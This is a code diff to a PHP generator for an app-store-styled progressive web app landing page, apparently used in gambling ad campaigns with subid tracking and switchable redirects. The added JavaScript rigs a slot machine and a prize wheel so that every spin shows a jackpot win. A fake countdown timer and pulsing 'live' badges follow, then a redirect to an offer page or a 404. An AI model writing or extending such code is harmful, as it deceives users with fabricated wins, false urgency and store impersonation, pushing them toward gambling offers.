+                    . '</nav>'
+                    . '</div>'
+                    . '</div>'
+                    . '</div>';
+            }
         }
 
         // The two serve-time placeholders stay literal in the source: the
@@ -880,6 +1064,68 @@ SW;
   }
   function redirect() { if (lpUrl) window.location.href = lpUrl; }
   function later(sec, fn) { if (sec > 0) setTimeout(fn, sec * 1000); else fn(); }
+
+  // Synthesized audio & haptics for casino/gaming atmosphere
+  function playTick() {
+    if (!cfg.sound) return;
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var osc = ctx.createOscillator();
+      var g = ctx.createGain();
+      osc.type = 'triangle';
+      osc.frequency.setValueAtTime(600, ctx.currentTime);
+      osc.frequency.exponentialRampToValueAtTime(150, ctx.currentTime + 0.04);
+      g.gain.setValueAtTime(0.2, ctx.currentTime);
+      g.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.04);
+      osc.connect(g);
+      g.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.04);
+    } catch (e) {}
+  }
+
+  function playWin() {
+    if (!cfg.sound) return;
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      [523.25, 659.25, 783.99, 1046.50].forEach(function (freq, i) {
+        var osc = ctx.createOscillator();
+        var g = ctx.createGain();
+        osc.type = 'triangle';
+        osc.frequency.value = freq;
+        g.gain.setValueAtTime(0.25, ctx.currentTime + i * 0.1);
+        g.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + i * 0.1 + 0.35);
+        osc.connect(g);
+        g.connect(ctx.destination);
+        osc.start(ctx.currentTime + i * 0.1);
+        osc.stop(ctx.currentTime + i * 0.1 + 0.35);
+      });
+    } catch (e) {}
+  }
+
+  function vib(pat) {
+    if (!cfg.vibration) return;
+    if (navigator.vibrate) try { navigator.vibrate(pat); } catch (e) {}
+  }
+
+  function startTimer() {
+    var els = document.querySelectorAll('.pwa-countdown');
+    if (!els.length) return;
+    var sec = 299;
+    var t = setInterval(function () {
+      sec--;
+      if (sec < 0) { clearInterval(t); return; }
+      var m = String(Math.floor(sec / 60)).padStart(2, '0');
+      var s = String(sec % 60).padStart(2, '0');
+      for (var i = 0; i < els.length; i++) els[i].textContent = m + ':' + s;
+    }, 1000);
+  }
+
+  // Expose helpers globally so custom mini-games & tracking scripts can call them
+  window.orbitraRedirect = redirect;
+  window.orbitraBeacon = beacon;
+  window.redirect = redirect;
+  window.beacon = beacon;
 
   var preloader = document.getElementById('pwa-preloader');
   if (preloader) { setTimeout(function () { preloader.classList.add('done'); }, 600); }
@@ -957,6 +1203,80 @@ SW;
   if (pushAllow) pushAllow.addEventListener('click', enablePush);
   if (pushLater) pushLater.addEventListener('click', afterPush);
 
+  // --- Slot machine interactive engine ---
+  var slotSpinBtn = document.getElementById('pwa-slot-spin-btn');
+  var slotWinModal = document.getElementById('pwa-slot-win-modal');
+  var slotMsg = document.getElementById('pwa-slot-msg');
+  var slotBalance = document.getElementById('pwa-slot-balance');
+  var isSlotSpinning = false;
+  if (slotSpinBtn) {
+    slotSpinBtn.addEventListener('click', function () {
+      if (isSlotSpinning) return;
+      isSlotSpinning = true;
+      beacon('intent');
+      vib([40, 30, 40]);
+      slotSpinBtn.disabled = true;
+      if (slotMsg) slotMsg.textContent = 'SPINNING THE REELS...';
+      var r0 = document.getElementById('pwa-reel-0');
+      var r1 = document.getElementById('pwa-reel-1');
+      var r2 = document.getElementById('pwa-reel-2');
+      if (r0) r0.classList.add('spinning');
+      if (r1) setTimeout(function(){ r1.classList.add('spinning'); }, 150);
+      if (r2) setTimeout(function(){ r2.classList.add('spinning'); }, 300);
+
+      var tickInterval = setInterval(playTick, 180);
+
+      setTimeout(function () {
+        if (r0) { r0.classList.remove('spinning'); r0.querySelector('.pwa-reel-strip').style.transform = 'translateY(-240px)'; vib(30); }
+      }, 1400);
+      setTimeout(function () {
+        if (r1) { r1.classList.remove('spinning'); r1.querySelector('.pwa-reel-strip').style.transform = 'translateY(-240px)'; vib(30); }
+      }, 1700);
+      setTimeout(function () {
+        clearInterval(tickInterval);
+        if (r2) { r2.classList.remove('spinning'); r2.querySelector('.pwa-reel-strip').style.transform = 'translateY(-240px)'; }
+        if (slotBalance) slotBalance.textContent = '25,000 COINS!';
+        if (slotMsg) slotMsg.textContent = '🎉 JACKPOT WINNER!';
+        playWin();
+        vib([80, 50, 150, 50, 200]);
+        setTimeout(function () {
+          if (slotWinModal) slotWinModal.hidden = false;
+          startTimer();
+          isSlotSpinning = false;
+        }, 500);
+      }, 2000);
+    });
+  }
+
+  // --- Lucky wheel interactive engine ---
+  var wheelSpinBtn = document.getElementById('pwa-wheel-spin-btn');
+  var wheelDisc = document.getElementById('pwa-wheel-disc');
+  var wheelWinModal = document.getElementById('pwa-wheel-win-modal');
+  var isWheelSpinning = false;
+  if (wheelSpinBtn) {
+    wheelSpinBtn.addEventListener('click', function () {
+      if (isWheelSpinning) return;
+      isWheelSpinning = true;
+      beacon('intent');
+      vib([50, 40, 50]);
+      wheelSpinBtn.disabled = true;
+      if (wheelDisc) {
+        var targetDeg = 1800 + 337.5;
+        wheelDisc.style.transition = 'transform 3.5s cubic-bezier(0.12, 0.95, 0.2, 1)';
+        wheelDisc.style.transform = 'rotate(' + targetDeg + 'deg)';
+      }
+      var wTick = setInterval(playTick, 240);
+      setTimeout(function () {
+        clearInterval(wTick);
+        playWin();
+        vib([100, 60, 200]);
+        if (wheelWinModal) wheelWinModal.hidden = false;
+        startTimer();
+        isWheelSpinning = false;
+      }, 3700);
+    });
+  }
+
   function handleInstallClick() {
     beacon('intent');
     if (isStandalone || window.__PWA_FORCE_APP_SCREEN === true) { later(0, redirect); return; }
@@ -1029,9 +1349,18 @@ SW;
   }
 })();
 JS;
+        $targetActionUrl = '{lp_url}';
+        if (($c['action_target'] ?? '') === 'to_campaign' && (int) ($c['action_campaign_id'] ?? 0) > 0) {
+            $targetActionUrl = '/?campaign_id=' . (int) $c['action_campaign_id'] . '&subid={subid}';
+        } elseif (($c['action_target'] ?? '') === 'to_url' && trim((string) ($c['action_url'] ?? '')) !== '') {
+            $targetActionUrl = trim((string) $c['action_url']);
+        } elseif (($c['action_target'] ?? '') === 'not_found') {
+            $targetActionUrl = '/404';
+        }
+
         $js = str_replace(
             ['__CFG_JSON__', '__SUBID__', '__LP_URL__', '__VAPID_PUBLIC__'],
-            [json_encode($cfgForJs, JSON_UNESCAPED_UNICODE), '{subid}', '{lp_url}', '{vapid_public}'],
+            [json_encode($cfgForJs, JSON_UNESCAPED_UNICODE), '{subid}', $targetActionUrl, '{vapid_public}'],
             $js
         );
 
@@ -1159,19 +1488,111 @@ html:not([data-store="app_store"]) .store-ios{display:none!important}
 .ios-push-text{font-size:14px;line-height:1.45;color:var(--pwa-muted);margin-bottom:4px}
 .ios-push-allow{background:var(--pwa-primary)!important;color:#fff!important}
 .ios-push-later{background:transparent!important;color:var(--pwa-muted)!important;margin-top:8px!important}
-#pwa-app-screen{position:fixed;inset:0;background:var(--pwa-bg);z-index:40;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;text-align:center;padding:24px}
-.appscr-icon{width:96px;height:96px;border-radius:22px;overflow:hidden;box-shadow:0 10px 24px rgba(0,0,0,.18)}
-.appscr-icon img{width:100%;height:100%;object-fit:cover}
-.appscr-letter{display:flex;align-items:center;justify-content:center;width:100%;height:100%;font-size:40px;font-weight:700;color:#fff;background:var(--pwa-primary)}
-.appscr-title{font-size:22px;font-weight:600;color:var(--pwa-text)}
-.appscr-text{font-size:14px;color:var(--pwa-muted);max-width:320px;line-height:1.45}
-#pwa-app-screen .install-btn{width:auto;padding:12px 44px}
-.appscr-hero{position:absolute;top:0;left:0;right:0;height:46%;overflow:hidden}
-.appscr-hero img{width:100%;height:100%;object-fit:cover}
-#pwa-app-screen.has-hero{justify-content:flex-end;padding-bottom:40px}
-#pwa-app-screen>*:not(.appscr-hero){position:relative;z-index:1}
-.appscr-icon{width:96px;height:96px;border-radius:22px;overflow:hidden;box-shadow:0 10px 24px rgba(0,0,0,.18);border:2px solid var(--pwa-bg)}
+/* Native In-App Screen Styles (app_action=screen) */
+#pwa-app-screen{position:fixed;inset:0;background:#070a10;z-index:40;overflow-y:auto;overflow-x:hidden;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-font-smoothing:antialiased}
+.appscr-bg-canvas{min-height:100%;position:relative;display:flex;flex-direction:column;background:radial-gradient(circle at 50% 20%, rgba(26,115,232,0.15), transparent 70%), #070a10}
+.appscr-hero-wrap{position:absolute;top:0;left:0;right:0;height:48%;max-height:360px;overflow:hidden;pointer-events:none;z-index:0}
+.appscr-hero-img{width:100%;height:100%;object-fit:cover;object-position:top center}
+.appscr-hero-gradient{background:linear-gradient(180deg, var(--pwa-primary) 0%, rgba(7,10,16,0.9) 100%)}
+.appscr-hero-vignette{position:absolute;inset:0;background:linear-gradient(to bottom, rgba(7,10,16,0.1) 0%, rgba(7,10,16,0.7) 65%, #070a10 100%)}
+.appscr-shell{position:relative;z-index:1;flex:1;display:flex;flex-direction:column;padding:12px 16px 72px;max-width:440px;margin:0 auto;width:100%;box-sizing:border-box}
+.appscr-header{display:flex;align-items:center;justify-content:space-between;padding:4px 0 10px;gap:8px}
+.appscr-user-badge{display:flex;align-items:center;gap:8px;background:rgba(255,255,255,0.08);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);padding:4px 10px 4px 4px;border-radius:24px;border:1px solid rgba(255,255,255,0.14)}
+.appscr-avatar{width:32px;height:32px;border-radius:50%;overflow:hidden;background:var(--pwa-primary);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;color:#fff;border:1.5px solid rgba(255,255,255,0.3)}
+.appscr-avatar img{width:100%;height:100%;object-fit:cover}
+.appscr-avatar-txt{display:flex;align-items:center;justify-content:center;width:100%;height:100%;font-size:16px;font-weight:700}
+.appscr-user-name{font-size:12px;font-weight:700;line-height:1.2;color:#fff;max-width:105px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.appscr-user-sub{font-size:9px;color:#00e676;font-weight:700;letter-spacing:0.4px}
+.appscr-header-right{display:flex;align-items:center;gap:6px}
+.appscr-balance-pill{display:flex;align-items:center;gap:4px;background:rgba(245,176,65,0.18);border:1px solid rgba(245,176,65,0.45);border-radius:18px;padding:5px 9px;font-size:10px;font-weight:800;color:#ffd700;backdrop-filter:blur(12px)}
+.appscr-bell{width:30px;height:30px;border-radius:50%;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);display:flex;align-items:center;justify-content:center;font-size:13px}
+.appscr-body{flex:1;display:flex;flex-direction:column;justify-content:flex-end;padding-top:70px}
+.appscr-main-card{background:rgba(18,24,38,0.8);backdrop-filter:blur(22px);-webkit-backdrop-filter:blur(22px);border:1px solid rgba(255,255,255,0.14);border-radius:20px;padding:18px 16px 16px;box-shadow:0 16px 40px rgba(0,0,0,0.55);text-align:center}
+.appscr-card-badges{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:10px;flex-wrap:wrap}
+.appscr-badge-live{background:#e74c3c;color:#fff;font-size:9px;font-weight:800;padding:2px 7px;border-radius:8px;letter-spacing:0.4px;animation:pwaPulse 1.8s infinite}
+.appscr-badge-rtp{background:rgba(255,255,255,0.12);color:#ffd700;font-size:9px;font-weight:700;padding:2px 7px;border-radius:8px}
+.appscr-headline{font-size:19px;font-weight:800;line-height:1.25;color:#ffffff;text-shadow:0 2px 12px rgba(0,0,0,0.7);margin-bottom:6px}
+.appscr-subtext{font-size:12px;line-height:1.45;color:rgba(255,255,255,0.8);margin-bottom:14px}
+.appscr-cta-wrap{margin-top:8px}
+.appscr-cta-btn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:14px 20px;font-size:15px;font-weight:800;text-transform:uppercase;letter-spacing:0.4px;color:#fff;background:linear-gradient(135deg, var(--pwa-primary) 0%, color-mix(in srgb, var(--pwa-primary) 70%, #fff) 100%);border:none;border-radius:26px;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,0.45), 0 0 20px color-mix(in srgb, var(--pwa-primary) 40%, transparent);position:relative;overflow:hidden;transition:transform 0.15s ease}
+.appscr-cta-btn:active{transform:scale(0.98)}
+.appscr-cta-arrow{font-size:16px;transition:transform 0.2s}
+.appscr-trust-row{display:flex;align-items:center;justify-content:center;gap:6px;font-size:9px;color:rgba(255,255,255,0.55);margin-top:8px;font-weight:500}
+.appscr-lobby-section{margin-top:14px}
+.appscr-section-head{display:flex;align-items:center;justify-content:space-between;font-size:10px;font-weight:700;color:rgba(255,255,255,0.5);letter-spacing:0.5px;margin-bottom:8px;padding:0 2px}
+.appscr-see-all{color:var(--pwa-primary);cursor:pointer}
+.appscr-tiles-row{display:grid;grid-template-columns:repeat(3, 1fr);gap:6px}
+.appscr-tile{background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:12px;padding:10px 4px;display:flex;flex-direction:column;align-items:center;text-align:center;gap:3px;cursor:pointer;transition:all 0.15s}
+.appscr-tile:active{transform:scale(0.95)}
+.appscr-tile.active{background:rgba(255,255,255,0.12);border-color:var(--pwa-primary);box-shadow:0 4px 14px rgba(0,0,0,0.3)}
+.appscr-tile-icon{font-size:20px;margin-bottom:1px}
+.appscr-tile-name{font-size:10px;font-weight:700;color:#fff;line-height:1.2}
+.appscr-tile-badge{font-size:7.5px;font-weight:800;padding:1px 4px;border-radius:5px;background:rgba(255,255,255,0.12);color:rgba(255,255,255,0.8)}
+.appscr-tile-badge.gold{background:rgba(245,176,65,0.25);color:#ffd700}
+.appscr-tabbar{position:fixed;left:0;right:0;bottom:0;background:rgba(8,12,18,0.92);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-top:1px solid rgba(255,255,255,0.1);display:flex;justify-content:space-around;padding:6px 0 14px;z-index:50}
+.appscr-tab{display:flex;flex-direction:column;align-items:center;gap:2px;font-size:9px;color:rgba(255,255,255,0.45);font-weight:600;cursor:pointer}
+.appscr-tab.active{color:var(--pwa-primary)}
+.appscr-tab-icon{font-size:16px}
+@keyframes pwaPulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.8;transform:scale(1.05)}}
+
+/* Custom App Screen Mode */
+.appscr-custom-mode{min-height:100vh;background:#0d1117;color:#fff;overflow-y:auto}
+.appscr-custom-container{width:100%;min-height:100vh}
+
+/* Slot Machine Mode */
+.appscr-slot-mode{background:radial-gradient(circle at 50% 30%, #1a103c 0%, #080612 100%)}
+.slot-shell{display:flex;flex-direction:column;align-items:center;min-height:100vh;justify-content:space-between;padding-bottom:30px}
+.pwa-slot-cabinet{width:100%;max-width:380px;background:linear-gradient(180deg, #241442 0%, #120924 100%);border:2px solid #ffd700;border-radius:24px;padding:16px;box-shadow:0 0 35px rgba(255,215,0,0.25), 0 20px 50px rgba(0,0,0,0.8);margin:auto 0}
+.pwa-jackpot-ribbon{display:flex;flex-direction:column;align-items:center;gap:2px;background:linear-gradient(90deg, #d35400, #f39c12, #d35400);padding:6px 12px;border-radius:12px;margin-bottom:14px;box-shadow:0 4px 15px rgba(243,156,18,0.4)}
+.jackpot-glow{font-size:10px;font-weight:900;letter-spacing:1px;color:#fff;text-shadow:0 1px 4px rgba(0,0,0,0.6)}
+.jackpot-val{font-size:18px;font-weight:900;color:#fff;font-family:monospace;letter-spacing:0.5px}
+.pwa-slot-window{background:#000;border:3px solid #3d2375;border-radius:16px;padding:8px;position:relative;overflow:hidden;box-shadow:inset 0 0 20px rgba(0,0,0,0.9)}
+.pwa-slot-payline{position:absolute;left:0;right:0;top:50%;height:3px;background:linear-gradient(90deg, transparent, #ff007f, #ffd700, #ff007f, transparent);transform:translateY(-50%);z-index:10;pointer-events:none;box-shadow:0 0 10px #ff007f}
+.pwa-slot-reels{display:grid;grid-template-columns:repeat(3, 1fr);gap:8px;height:120px;overflow:hidden}
+.pwa-reel{background:#180d30;border-radius:10px;overflow:hidden;position:relative;display:flex;justify-content:center}
+.pwa-reel-strip{display:flex;flex-direction:column;transition:transform 0.4s cubic-bezier(0.1, 0.9, 0.2, 1);will-change:transform}
+.pwa-sym{height:80px;display:flex;align-items:center;justify-content:center;font-size:42px;user-select:none}
+.pwa-reel.spinning .pwa-reel-strip{animation:reelRoll 0.18s linear infinite;filter:blur(2px)}
+@keyframes reelRoll{0%{transform:translateY(0)}100%{transform:translateY(-240px)}}
+.pwa-slot-controls{margin-top:16px;display:flex;flex-direction:column;align-items:center;gap:10px}
+.pwa-slot-status{font-size:11px;font-weight:800;color:#ffd700;letter-spacing:0.5px;min-height:16px;text-align:center}
+.pwa-slot-spin-btn{width:100%;padding:16px 24px;border:none;border-radius:30px;background:linear-gradient(135deg, #ff007f 0%, #ff7700 100%);color:#fff;font-size:18px;font-weight:900;letter-spacing:1px;cursor:pointer;box-shadow:0 8px 25px rgba(255,0,127,0.5), inset 0 2px 0 rgba(255,255,255,0.4);position:relative;overflow:hidden;transition:transform 0.1s}
+.pwa-slot-spin-btn:active{transform:scale(0.97)}
+.pwa-slot-spins-left{font-size:10px;color:rgba(255,255,255,0.6);font-weight:700}
+
+/* Wheel Mode */
+.appscr-wheel-mode{background:radial-gradient(circle at 50% 30%, #152238 0%, #070c14 100%)}
+.wheel-shell{display:flex;flex-direction:column;align-items:center;min-height:100vh;justify-content:space-between;padding-bottom:30px}
+.pwa-wheel-stage{display:flex;flex-direction:column;align-items:center;margin:auto 0;width:100%}
+.pwa-wheel-headline{font-size:22px;font-weight:900;color:#ffd700;letter-spacing:0.5px;text-shadow:0 2px 10px rgba(255,215,0,0.4);text-align:center}
+.pwa-wheel-subhead{font-size:12px;color:rgba(255,255,255,0.7);margin-top:4px;margin-bottom:20px;text-align:center;max-width:320px}
+.pwa-wheel-container{position:relative;width:290px;height:290px;display:flex;align-items:center;justify-content:center}
+.pwa-wheel-pointer{position:absolute;top:-10px;left:50%;transform:translateX(-50%);font-size:26px;color:#ffd700;z-index:20;filter:drop-shadow(0 4px 8px rgba(0,0,0,0.8))}
+.pwa-wheel-disc{width:100%;height:100%;filter:drop-shadow(0 10px 30px rgba(0,0,0,0.7));will-change:transform}
+.pwa-wheel-spin-btn{position:absolute;width:68px;height:68px;border-radius:50%;background:radial-gradient(circle, #ffd700 0%, #e67e22 100%);color:#1e272e;font-weight:900;font-size:14px;border:3px solid #fff;cursor:pointer;box-shadow:0 4px 15px rgba(0,0,0,0.5);z-index:15;display:flex;align-items:center;justify-content:center}
+.pwa-wheel-spins-hint{font-size:11px;color:#ffd700;font-weight:800;margin-top:20px;letter-spacing:0.5px}
+
+/* Win Modals */
+.pwa-modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;z-index:100;padding:20px}
+.pwa-modal-card{background:linear-gradient(180deg, #1f2a44 0%, #0d1424 100%);border:2px solid #ffd700;border-radius:24px;padding:28px 20px 22px;text-align:center;max-width:360px;width:100%;box-shadow:0 0 50px rgba(255,215,0,0.35);animation:pwaPop 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)}
+.pwa-modal-confetti{font-size:48px;margin-bottom:6px;animation:pwaPulse 1.2s infinite}
+.pwa-modal-timer{display:inline-flex;align-items:center;gap:6px;background:rgba(231,76,60,0.18);border:1px solid rgba(231,76,60,0.45);color:#ff6b6b;font-size:11px;font-weight:800;padding:5px 12px;border-radius:14px;margin-bottom:16px;letter-spacing:0.5px}
+.pwa-countdown{font-family:monospace;font-size:12px;color:#fff}
+.appscr-ticker-wrap{background:rgba(0,0,0,0.45);border-bottom:1px solid rgba(255,255,255,0.08);padding:6px 0;overflow:hidden;white-space:nowrap;font-size:10.5px;color:#ffd700;font-weight:600}
+.appscr-ticker-content{display:inline-block;padding-left:100%;animation:tickerScroll 24s linear infinite}
+.appscr-ticker-content span{color:rgba(255,255,255,0.85);margin:0 8px}
+.gp-live-counter, .ios-live-counter{display:inline-flex;align-items:center;gap:4px;font-size:11px;color:#00e676;font-weight:700;margin-left:6px;animation:pwaPulse 2s infinite}
+.btn-glow-active{position:relative;overflow:hidden;box-shadow:0 0 22px color-mix(in srgb, var(--pwa-primary) 50%, transparent)!important}
+.btn-glow-active::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(60deg, transparent, rgba(255,255,255,0.3), transparent);transform:rotate(25deg);animation:shimmerGlow 3s infinite}
+@keyframes shimmerGlow{0%{transform:translateX(-100%) rotate(25deg)}100%{transform:translateX(100%) rotate(25deg)}}
+@keyframes tickerScroll{0%{transform:translateX(0)}100%{transform:translateX(-100%)}}
+@keyframes pwaPop{0%{transform:scale(0.8);opacity:0}100%{transform:scale(1);opacity:1}}
 CSS;
+
+        $customCssBlock = $c['custom_css'] !== '' ? "\n/* Custom Styles */\n" . $c['custom_css'] . "\n" : '';
+        $customHead = $c['custom_head_code'] !== '' ? "\n" . $c['custom_head_code'] . "\n" : '';
+        $customBody = $c['custom_body_code'] !== '' ? "\n" . $c['custom_body_code'] . "\n" : '';
+        $customJsBlock = $c['custom_js'] !== '' ? "\n<script>\n" . $c['custom_js'] . "\n</script>\n" : '';
 
         return '<!DOCTYPE html>
 <html lang="' . self::esc($lang) . '">
@@ -1193,9 +1614,11 @@ CSS;
   document.documentElement.setAttribute("data-store", effective);
 })();
 </script>
-<style>' . $css . '</style>
+<style>' . $css . $customCssBlock . '</style>
+' . $customHead . '
 </head>
 <body>
+' . $customBody . '
 ' . $preloader . '
 <div class="store-layout store-gp">' . $gpPage . '</div>
 <div class="store-layout store-ios">' . $iosPage . '</div>
@@ -1206,6 +1629,7 @@ CSS;
 <script>
 ' . $js . '
 </script>
+' . $customJsBlock . '
 </body>
 </html>
 ';
